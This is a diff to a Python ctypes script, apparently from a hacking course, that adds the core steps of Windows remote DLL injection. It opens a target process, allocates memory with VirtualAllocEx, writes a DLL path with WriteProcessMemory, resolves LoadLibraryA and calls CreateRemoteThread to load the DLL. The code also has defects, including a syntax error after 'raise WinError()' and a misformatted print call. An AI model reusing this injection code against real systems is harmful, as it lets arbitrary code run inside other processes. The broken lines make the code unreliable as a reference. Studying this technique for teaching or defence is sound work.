@@ -1,5 +1,6 @@
-# Remote DLL Injection - UNDER CONSTRUCTION FOR COMPLETION OF TESTING
+# Remote DLL Injection
 # Credit goes to TCM Python 201 For Hackers Course
+# Can only load once, so if doing multiple times we will need to use different PIDs
 
 from ctypes import *
 from ctypes import wintypes
@@ -62,3 +63,27 @@ if not handle:
 print("Hooks in => {0:X}".format(handle))
 
 #Use VirtualAllocEx to create memory in the process
+
+remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+
+if not remote_memory:
+    raise WinError()
+
+print ("Memory allocated => {0:X}", hex(remote_memory))
+
+#write file location into process memory
+write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)
+
+if not write:
+    raise WinError():
+
+print("Bytes written => {}".format(dll))
+
+# start a new thread to load the DLL with load library A, we can find this with GetProcAddress and GetModuleHandle
+
+load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll") , b"LoadLibraryA")
+
+print("LoadLibrary address => ", hex(load_lib))
+
+#create the remote thread
+rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
